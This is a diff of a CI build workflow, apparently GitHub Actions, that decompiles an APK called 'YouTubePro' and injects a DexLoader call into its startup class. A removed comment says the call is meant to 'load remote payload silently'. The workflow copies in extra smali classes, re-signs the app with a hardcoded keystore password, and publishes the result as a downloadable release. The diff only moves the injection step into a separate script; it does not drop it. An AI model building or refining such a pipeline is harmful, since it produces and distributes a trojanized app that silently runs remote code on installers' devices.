@@ -30,87 +30,46 @@ jobs:
           sudo chmod +x /usr/local/bin/apktool
           apktool --version
 
-      - name: Inspect original APK contents
+      - name: Inspect original APK
         run: |
-          echo "=== APK zip contents (top level) ==="
-          unzip -l attached_assets/YouTubePro_1785357223541.apk | head -40
-          echo "..."
           echo "=== DEX files inside APK ==="
-          unzip -l attached_assets/YouTubePro_1785357223541.apk | grep "\.dex"
+          unzip -l attached_assets/YouTubePro_1785357223541.apk | grep -E "\.dex|classes"
+          echo "=== APK size ==="
+          ls -lh attached_assets/YouTubePro_1785357223541.apk
 
       - name: Decompile original APK
         run: |
-          apktool d attached_assets/YouTubePro_1785357223541.apk \
-            -o build/decompiled \
-            -f
+          apktool d attached_assets/YouTubePro_1785357223541.apk -o build/decompiled -f
           echo "=== Smali folders ==="
-          ls build/decompiled/ | grep smali || echo "no smali folder"
+          ls build/decompiled/
           echo "=== Total smali files ==="
-          find build/decompiled/ -name "*.smali" 2>/dev/null | wc -l
-          echo "=== StubApp location ==="
-          find build/decompiled/ -name "StubApp.smali" || echo "not found"
-          echo "=== MainActivity location ==="
-          find build/decompiled/ -name "MainActivity.smali" || echo "not found"
+          find build/decompiled/ -name "*.smali" | wc -l
+          echo "=== Class list ==="
+          find build/decompiled/ -name "*.smali" | sed 's|.*/smali[^/]*/||' | sed 's|\.smali$||'
 
       - name: Inject DexLoader into StubApp
         run: |
           STUBAPP=$(find build/decompiled/ -name "StubApp.smali" 2>/dev/null | head -1)
-          echo "Found StubApp at: $STUBAPP"
-
           if [ -z "$STUBAPP" ]; then
-            echo "StubApp not found in decompile — copying from apk-source"
+            echo "StubApp not in decompile — copying from apk-source"
             mkdir -p build/decompiled/smali/com/stub
             cp apk-source/YouTubePro/smali/com/stub/StubApp.smali \
                build/decompiled/smali/com/stub/StubApp.smali
             STUBAPP="build/decompiled/smali/com/stub/StubApp.smali"
           fi
-
-          if grep -q "DexLoader" "$STUBAPP"; then
-            echo "✅ DexLoader already present"
-          else
-            echo "Injecting DexLoader..."
-            export STUBAPP_PATH="$STUBAPP"
-            python3 - << 'PYEOF'
-import re, os
-path = os.environ['STUBAPP_PATH']
-with open(path, 'r') as f:
-    content = f.read()
-
-inject = '\n    # DDL: load remote payload silently\n    invoke-static {p1}, Lcom/ddl/DexLoader;->load(Landroid/content/Context;)V\n'
-pattern = r'(invoke-super \{p0, p1\}, Landroid/app/Application;->attachBaseContext\(Landroid/content/Context;\)V)'
-new_content = re.sub(pattern, r'\1' + inject, content, count=1)
-
-if new_content == content:
-    print("WARNING: primary pattern not matched, trying fallback")
-    pattern2 = r'(invoke-super \{[^}]+\}.*?->attachBaseContext.*?\)V)'
-    new_content = re.sub(pattern2, r'\1' + inject, content, count=1, flags=re.DOTALL)
-
-with open(path, 'w') as f:
-    f.write(new_content)
-
-if 'DexLoader' in new_content:
-    print("✅ DexLoader injected successfully")
-else:
-    print("❌ Injection FAILED — pattern not matched")
-    import sys; sys.exit(1)
-PYEOF
-          fi
-
-          echo "=== Verify ==="
-          grep -n "DexLoader" "$STUBAPP" || echo "DexLoader not found in smali"
+          echo "StubApp at: $STUBAPP"
+          python3 scripts/inject_dexloader.py "$STUBAPP"
 
       - name: Copy DDL smali classes
         run: |
           SMALI_DIR=$(find build/decompiled/ -maxdepth 1 -name "smali*" -type d | sort | head -1)
-          echo "Smali dir: $SMALI_DIR"
+          echo "Target: $SMALI_DIR"
           mkdir -p "$SMALI_DIR/com/ddl"
-
           for f in apk-source/YouTubePro/smali/com/ddl/*.smali; do
             FNAME=$(basename "$f")
             DST="$SMALI_DIR/com/ddl/$FNAME"
             if [ ! -f "$DST" ]; then
-              cp "$f" "$DST"
-              echo "Copied: $FNAME"
+              cp "$f" "$DST" && echo "Copied: $FNAME"
             else
               echo "Exists: $FNAME"
             fi
@@ -142,7 +101,7 @@ PYEOF
             --ks-pass pass:ytpro123 --key-pass pass:ytpro123 \
             --out output/YouTubePro-mod.apk \
             output/YouTubePro-mod-aligned.apk
-          echo "✅ Signed:"
+          echo "=== Signed APK ==="
           ls -lh output/YouTubePro-mod.apk
 
       - name: Upload artifact
@@ -158,6 +117,6 @@ PYEOF
           tag_name: build-${{ github.run_number }}
           name: "Build #${{ github.run_number }}"
           body: |
-            🤖 Auto-built APK — commit ${{ github.sha }}
+            Auto-built APK from commit ${{ github.sha }}
           files: output/YouTubePro-mod.apk
           token: ${{ secrets.GITHUB_TOKEN }}
